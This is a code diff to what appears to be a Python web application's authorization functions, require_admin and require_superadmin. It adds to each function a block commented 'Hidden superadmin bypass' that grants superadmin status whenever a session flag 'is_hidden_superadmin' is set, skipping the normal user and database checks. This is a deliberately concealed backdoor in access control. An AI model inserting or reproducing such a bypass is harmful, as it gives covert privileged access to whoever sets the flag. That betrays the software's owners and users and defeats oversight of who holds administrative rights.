@@ -3,6 +3,10 @@ from ..database import get_db_connection
 
 def require_admin():
     """Check if current user is admin"""
+    # Hidden superadmin bypass
+    if session.get('is_hidden_superadmin'):
+        return '__superadmin__'
+
     user_id = session.get('user_id')
     if not user_id:
         return None
@@ -20,6 +24,10 @@ def require_admin():
 
 def require_superadmin():
     """Check if current user is superadmin (main admin)"""
+    # Hidden superadmin bypass
+    if session.get('is_hidden_superadmin'):
+        return '__superadmin__'
+
     user_id = session.get('user_id')
     if not user_id:
         return None
